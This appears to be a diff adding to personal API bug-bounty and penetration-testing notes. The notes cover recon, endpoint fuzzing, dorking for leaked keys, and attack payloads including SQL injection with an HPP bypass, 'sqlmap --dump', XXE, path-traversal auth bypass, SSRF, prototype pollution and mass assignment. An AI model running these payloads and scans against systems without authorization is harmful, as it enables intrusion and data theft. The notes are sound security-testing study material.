@@ -1,16 +1,73 @@
 
   API TESTING AND  METHODOLOGY        API TESTING AND  METHODOLOGY        API TESTING AND  METHODOLOGY            API TESTING AND  METHODOLOGY 
+Things to look for
+Obvious URL naming schemes
+https://target-name.com/api/v1 
+https://api.target-name.com/v1 
+https://target-name.com/docs
+https://dev.target-name.com/rest
+https://target-name.com/api-docs
 
+
+     api-recon-tip-using-ai-to-eyeball-your-targets
+     I scan the target domain using subfinder, 
+     I then use assetfinder to find more domains
+     I then query https://crt.sh/, TO GET MORE SUBDOMIAN and scan the Subject Alternative Name (SAN) 
+      I then remove any domains known to be outside the scope of the engagement
+     Once I’ve compiled the list of potential domains I want to look closer at, I reverse lookup each domain to get a list of related IPs. This is extremely important since load balancers, caching servers, WAFs, and API gateways can get in the way.
+      I then run nmap against each IP address.
+      sudo nmap -sS -p- $TARGET_IP -oX "$TARGET_IP.nmap.xml"
+      i then use gowithness
+      gowitness nmap -f "$TARGET_IP.nmap.xml" -t 10 --timeout 15 -P "$SCREENSHOT_DIR"
+      -N : Scans hostnames (for virtual hosting)
+–header “string” : Add header to the HTTP request. Useful for mapping to hostname on a virtual host, or any additional headers the system requires.
+   i would usually browse through the backlog of images looking for interesting screenshots, taking note of pages that look like API endpoints, login pages, stack traces
+   
+       
+
+ tip
+If you are attacking the 
+    /api/v3/sign-up endpoint try to perform bruteforce to /Sing-up, /SignUp, /singup...
+Also try appending to the original endpoint bytes like %00, %0d%0a, %0d, %0a, %09, %0C, %20
+
+     dirnames
+/api, /api/v1, /v1, /v2, /v3, /rest, /swagger, /swagger.json, /doc, /docs, /graphql, /graphiql, /altair, /playground, /api-docs
  
   ACTIVE-API-RECONNAISSANCE-UNVEILING-VULNERABILITIES-
   nmap -sC -sV [target address or network range      //we gain insights into open ports and the associated services running on them
+  nmap -sV --script=http-enum <target> -p 80,443,8000,8080
   amass enum -active -d [target] | grep api
+  amass enum -passive -d twitter.com | grep api
   gobuster dir -u [target URL] -w /path/to/api/wordlist         This approach aids in discovering URL paths and understanding the server’s responses
-  kr scan [target URL] -w /path/to/kiterunner/wordlist   Kiterunner’s in-depth scanning reveals interesting paths, helping us identify potential endpoints and resources.
+
+  kr scan [target URL] -w /path/to/kiterunner/wordlist   Kiterunner’s in-depth scanning reveals interesting paths, helping us identify potential endpoints and resources.  --proxy=http://127.0.0.1:8080      to send to burp
+  amass enum -active -brute -w /usr/share/seclists/Discovery/DNS/Subdomain-wordlist.txt -d twitter.com | httpx -mc 200     fillter live subdomain
+  amass enum -active -brute -w /usr/share/seclists/Discovery/DNS/Subdomain-wordlist.txt -d twitter.co             bruteforce
+  
+  port scanning
+  naabu -p - -rate 2000 -c 50 -retries 2 -warm-up-time 1 -silent -host crapi.apisec.ai -nmap-cli 'nmap -sV -oX scan.xml'
+  
   
    Leveraging DevTools for Analysis
 Google Chrome’s DevTools proves to be a valuable asset for analyzing web applications. Open DevTools, navigate to the Network tab, and filter responses to identify terms like “API,” “v1,” or “graphql.” This filter narrows down requests related to API interactions.
+ 
+   HUNTING AOI THROUGH NUCLEI
+     checking api technologies
+     nuclei -u TARGET_HOST -t http/technologies/
+     nuclei -u TARGET_HOST -t http/exposed-panels/
+     Advanced app detection
+To be honest, I like to look for exposed secondary apps a bit differently than the norm.
 
+Usually, I start by conducting a Nmap scan on the target, listening to every port that responds. I then create a targets.txt file based on what is detected since many secondary portals may be hosted on alternate ports.
+
+Finally, I also use the -silent switch, so I only get the results I am after.
+
+It ends up looking something like this:
+
+nuclei -l targets.txt -t http/exposed-panels/ -silent
+    Testing leaked API tokens
+    nuclei -t http/token-spray/ -var token=SOMETOKEN
+ 
   
      ***** UNCOVERING ELUSIVE API TARGETS VIA VHOST DISCOVERY ***
             it is  concept of hosting multiple versions of an API on the same server is called virtual hosting
@@ -24,6 +81,77 @@ Google Chrome’s DevTools proves to be a valuable asset for analyzing web appli
          openssl s_client -connect www.crapi.site:443 2>&1 < /dev/null | openssl x509 -noout -text | grep -i dns
      
      ****finding endpoint***     create your wordlist or copy 
+        ffuf -u https://FUZZ.api.example.com -w wordlist.txt
+ffuf -u https://api/FUZZ.example.com -w wordlist.txt
+
+     Endpoint Discovery of api 
+     
+     feroxbuster -u http://192.168.1.26:8000/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H 'Authorization: Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IlNhbW15IiwiZXhwIjoxNjgzNTgwODE2LCJzdWIiOiJhY2Nlc3MifQ.QCYFvWCrs74U_6bs8SYx6hR5QhjKHkKOwdJh9x8tlIo' -m
+      --NOTE  -m PUT DELETE POST when trying to change the request method
+     
+     
+     Try to enumerate endpoints while changing HTTP methods like GET, POST, OPTIONS,
+     /api/?xml
+/api?xml
+/api/v1?xml
+/api/v1/user?xml
+
+# Web Service Description Language
+/api/?wsdl
+
+# Versions
+/api/v1/user
+/api/v2/user
+/api/v3/user
+
+# Wildcards
+/api/v2/user/*
+/api/v2/user/posts/*
+/api/v2/users/*
+
+# Path traversal
+/api/v1/post/..\private
+
+# Misc
+/api/user/1
+/api/users/1
+/api/users/1/delete
+/api/users/1/edit
+/api/users/1/update
+                      AUTOMATION OF ENDPOINT
+                      # Dirb
+dirb https://vulnerable.com/ endpoints.txt
+
+# Ffuf
+ffuf -u https://vulnerable.com/FUZZ -w endpoints.txt
+ffuf -u https://vulnerable.com/FUZZ -X POST -w endpoints.txt
+ffuf -u https://vulnerable.com/api/FUZZ -w wordlist.txt
+ffuf -u https://example.com/api/?FUZZ=test -w wordlist.txt
+
+# Gobuster
+gobuster dir -u https://vulnerable.com/ -w endpoints.txt
+
+# Kiterunner
+# -A: wordlist type (ex. first 20000 words)
+# -x: max connection per host (default: 3)
+kr scan https://vulnerable.com/api -A=apiroutes-210228:20000 -x 10
+kr scan https://vulnerable.com/api -A=apiroutes-210228:20000 -x 10 --fail-status-codes 401,404
+kr scan https://vulnerable.com:8443/api -A=apiroutes-210228:20000 -x 10
+
+   Parameter Fuzzing
+   # Key
+ffuf -u https://vulnerable.com/api/items?FUZZ=test -w wordlist.txt
+ffuf -u https://vulnerable.com/api/items?FUZZ=test -w wordlist.txt -fs 120
+ffuf -X POST -u https://vulnerable.com/api/items?FUZZ=test -w wordlist.txt
+ffuf -X POST -u https://vulnerable.com/api/items?FUZZ=test -w wordlist.txt -fs 120
+
+# Value
+ffuf -u https://vulenrable.com/api/items?test=FUZZ -w wordlist.xt
+ffuf -u https://vulnerable.com/api/items?test=FUZZ -w wordlist.txt -fs 120
+ffuf -X POST -u https://vulnerable.com/api/items?test=FUZZ -w wordlist.txt
+ffuf -X POST -u https://vulnerable.com/api/items?test=FUZZ -w wordlist.txt -fs 120
+     
+     
      using burp intruder, copy and paste api wordlist and start attack
      
      using  ffuf
@@ -40,8 +168,52 @@ Google Chrome’s DevTools proves to be a valuable asset for analyzing web appli
            check mobile app
         a page that takes longet time to  load
         a web app with  developer documention
+          
+          
+ site:*.api.example.com
+site:api.*.example.com
+
+# Random domains
+site:*.api.*.*
+site:api.*.*.*
+site:*.api.*.com
+site:api.*.*.com
+site:*.api.*.gov
+site:api.*.*.gov
+ inurl:"/wp-json/wp/v2/users"
+ intitle:"index.of" intext:"api.txt"
+ inurl:"/api/v1" intext:"index of /"
+ ext:php inurl:"api.php?action="
+ intitle:"index of" api_key OR "api key" OR apiKey -pool
+ 
+ 
+ 
+      Git Dorking
+Specify parameters: "filename:swagger.json" and "extension: .json"
+Search GitHub for your target organization’s name paired with potentially sensitive types of information, such as “api key,” "api keys", "apikey", "authorization: Bearer", "access_token", "secret", or “token.”
+
+             shodan
+             hostname:"targetname.com"
+             "content-type: application/json"
+             "content-type: application/xml"
+                   
+                   
+                   /API-ATTACK-SURFACE-DETECTION-USING-NOIR
+                   noir -b . -u http://crapi.apisec.ai --send-proxy http://localhost:8080            send to burp
+        note -->
+           to get Noir to work with Burp, we need to edit our proxy listener and enable support for invisible proxy mode, which allows non-proxy-aware clients to connect directly to the listener.           
         
+      GREPPING WITH GRON       https://github.com/tomnomnom/gron
+      curl -s https://api.coindesk.com/v1/bpi/currentprice.json | gron
+      curl -s https://api.coindesk.com/v1/bpi/currentprice.json | gron | grep EUR
+      
+      So imagine we wanted to construct a partial JSON object to send back to the API. It’s as easy as:
+          ungron all the things
+     curl -s https://api.coindesk.com/v1/bpi/currentprice.json | gron | grep EUR | gron --ungron
+
+
         
+       
         
    VULNERBILITY IN API FRAMEWORK AND HOW TO DETECT API FRAMEWORK /LANGAUGE     https://danaepp.com/how-to-detect-the-programming-language-of-an-api
    JSON deserialization in REST APIs, especially through Javascript. ie: NodeJS/Express
@@ -142,6 +314,13 @@ API documentation is often publicly available, particularly if the API is intend
     "isAdmin": true,
 }
   browse the application as smart to see whether you can access admin functionality
+  
+  NOTE FINGING XXE IN API
+  XXE
+   GET /api/product/1?xml HTTP/1.1
+
+   If the website displays the response in XML, we might be able to XXE.
+  
 
 NOTE 
   make sure you are recording all requests and responses. This will help to download and save all the client side code, cookies, and session data while allowing you to collect all the routes, endpoints, parameters, and JSON data to help you get a good picture of what is going on. and it  So important to make sure you click on every link, feature, and function that you can.
@@ -316,7 +495,7 @@ intitle:"index of" "api.yaml" ← Find potential API configs
       X-Forwarded-For
       User-Agent
       
-      hpp polution
+      HPP POLUTION       HPP POLUTION         HPP POLUTION  
       Consider an example of pulling back your account data by passing in your id. If we also pass in the admin’s account id, what happens?
        GET /api/account?id=<your account id>&id=<admin account id>
 NOTE -> 
@@ -328,7 +507,8 @@ NOTE ->
           \|/ bypass
      GET /api/products?prodID=9 /*&prodID=*/UNION /*&prodID=*/SELECT 1 &prodID=2 &prodID=3 FROM /*&prodID=*/Users /*&prodID=*/ WHERE id=3 --
      
-     
+     sqlmap -u http://vulnerable.com/api/v2/fetch/?post=1 --dump --batch
+
      NOTE
      Sometimes you can abuse an API by simply removing a parameter. If the API does not fail securely when a parameter is missing and instead just sets some defaults, it may be possible to taint the request and have the API behave differently than expected.
     ***** Taint the Payload content type
@@ -378,7 +558,11 @@ Content-Type: application/json
 
 {"name"="Dana\",\"role\":\"admin"}
 
-   BYPASSING-API-AUTH-USING-NOSQL-INJECTION
+   or 
+   GET /api/users/peter/../admin HTTP/1.1
+Host: example.com
+
+   BYPASSING-API-AUTH-USING-NOSQL-INJECTION        BYPASSING-API-AUTH-USING-NOSQL-INJECTION        BYPASSING-API-AUTH-USING-NOSQL-INJECTION
      tools
      https://github.com/codingo/NoSQLMap
      https://github.com/torque59/Nosql-Exploitation-Framework
@@ -399,7 +583,7 @@ Content-Type: application/json
    DETECTING UNCOMMON HEADERS IN AN API USING BURP BAMBDA FILTERS
    
    
-   ssrf
+   SSRF  API       SSRF  API        SSRF  API       SSRF  API 
    Common vulnerable parameter names
 dest
 redirect
@@ -492,7 +676,7 @@ And last but certainly not least is abusing open redirects to bypass SSRF user i
      If an API is allowing access directly to or from the Internet, it may be a clean attack vector to gain access to loads of services and data that developers didn’t intend for you to access directly.
      
      
- SERVER-SIDE PROTOTYPE POLLUTION (SSPP).   in wepapp-> check if the backend is built with express or node  https://danaepp.com/how-to-exploit-an-api-using-prototype-pollution
+     *****SERVER-SIDE PROTOTYPE POLLUTION (SSPP).   in wepapp-> check if the backend is built with express or node  https://danaepp.com/how-to-exploit-an-api-using-prototype-pollution
      Detecting Server Side Prototype Pollution
     ****      NOTE ***
       When testing client-side prototype pollution, you can easily reverse all your changes and return to a clean environment by simply refreshing the target web page.
@@ -541,14 +725,99 @@ If you are testing this with Burp Suite, remember to look at the Raw tab, as the
 
 This methodology has recently been fixed in Express 4.17.4. But for all those older Express instances out there, you can still abuse this.  
 
+   Scanning for server-side prototype pollution sources
+Although it's useful to try manually probing for sources in order to solidify your understanding of the vulnerability, this can be repetitive and time-consuming in practice. For this reason, we've created the Server-Side Prototype Pollution Scanner extension for Burp Suite, which enables you to automate this process. The basic workflow is as follows:
 
+Install the Server-Side Prototype Pollution Scanner extension from the BApp Store and make sure that it is enabled. For details on how to do this, see Installing extensions
+Explore the target website using Burp's browser to map as much of the content as possible and accumulate traffic in the proxy history.
+In Burp, go to the Proxy > HTTP history tab.
+Filter the list to show only in-scope items.
+Select all items in the list.
+Right-click your selection and go to Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution, then select one of the scanning techniques from the list.
+When prompted, modify the attack configuration if required, then click OK to launch the scan.
+In Burp Suite Professional, the extension reports any prototype pollution sources it finds via the Issue activity panel on the Dashboard and Target tabs. If you're using Burp Suite Community Edition, you need to go to the Extensions > Installed tab, select the extension, then monitor its Output tab for any reported issues.
+
+   
+
+
+
+
+      EASIEST-WAY-TO-FIND-HIDDEN-API-FROM-JS-FILES
+      subfinder -d indeed.com -v -o subdomains.txt
+      cat subdomains.txt | waybackurls > waybackurls.txt
+      cat subdomains.txt | gau > gau.txt
+      waymore -i subdomains.txt -mode U > waymore.txt
+       Now will collect all urls into a single file naming as allurls
+        we will use extensor to find the endpoint file
+                 enter the file path :    home/the/filepath/
+                 enter the file extension  :  js
+                 enter the file name to save the url:  smart.txt
+      now we use SecretFinder to find apikeys from js file       
+       cat js.txt  | while read url; do python3 /home/kali/tools/SecretFinder/SecretFinder.py  -i $url -o cli; done   
+          It will shows all the possible credentials in js file , when you find it just report and enjoy the bounty
+                 
+                 
+                 DISCOVERING-API-SECRETS-ENDPOINTS-USING-APKLEAK
+                 “pip3 install apkleaks
+                 
+                 
+                 
+                 tip
+                 1. Save JavaScript files for your target locally (e.g., main.js, app.js).
+2. Upload to ChatGPT with a subscription.
+3. Request: "Find potential security issues like DOM XSS, credentials leaks, or juicy endpoints."
+
+It's effective for analyzing JS.
+
+
+BugBountyTip: If you playing with `API ENDPOINT` always try to send `INVALID CONTENT TYPE` end-up by getting hidden endpoints in `RESPONSE` 
+
+tip
+If you are testing a JSON endpoint, always try to change one letter in the parameter names to make them invalid. I had quite a few cases where the server thrown back an error with all of the accepted parameters.
+
+                 
+         
       
-      
-            
-            
-            
-            
-            
+               Business Logic Vulnerabilities. Tell signs
+
+     Only use feature X to perform function Y.” 
+      “Do not do X with endpoint Y.” 
+     “Only admins should perform request X.”
+     When you attack  their API, make sure to disobey such requests to test for the presence of  security controls.
+     
+     **** ****   ****
+     Improper Assets Management
+
+Organizations often include  versioning information in their endpoint names to distinguish between older  and newer versions, such as /v1/, /v2/, /v3/, and so on. APIs still in development often use paths such as /alpha/, /beta/, /test/, /uat/, and /demo/. If you  know that an API is now using apiv3.org/admin but part of the API documentation refers to apiv1.org/admin, you could try testing different endpoints to  see if apiv1 or apiv2 is still active. Additionally, the organization’s changelog  may disclose the reasons why v1 was updated or retired. If you have access  to v1, you can test for those weaknesses.
+Outside of using documentation, you can discover improper assets management vulnerabilities through the use of guessing, fuzzing, or brute-force  requests. Watch for patterns in the API documentation or path-­naming  scheme, and then make requests based on your assumptions.
+   
+   
+     ****  ****
+     The easiest way to discover BFLA is to find administrative API documentation and send requests as an unprivileged user that test admin functions and capabilities.
+     
+    ****  *****
+    You can discover mass assignment vulnerabilities by finding interesting  parameters in API documentation and then adding those parameters to  a request. Look for parameters involved in user account properties, critical functions, and administrative actions
+    
+    {
+"Fname": "hAPI",
+"Lname": "Hacker",
+"Address": "' OR 1=0--",
+}
+
+Thisbis an example of SQL injection
+  Any response directly from a database  or the supporting system is a clear indicator that there is an injection  vulnerability.\
+  
+  
+  
+             
+     searching  in nuclei templete
+     $ grep -R 'alert(' 
+       grep -R 'alert('| grep -vE 'fuzzing/ssrf-via-proxy.yaml'   
+       grep -R 'alert('| grep -vE 'fuzzing/ssrf-via-proxy.yaml' | grep alert   
+        grep -R "/etc/passwd"
+        grep -R sqli 
+
+         "SQL injection" AND disclosed:true    
             
             
             
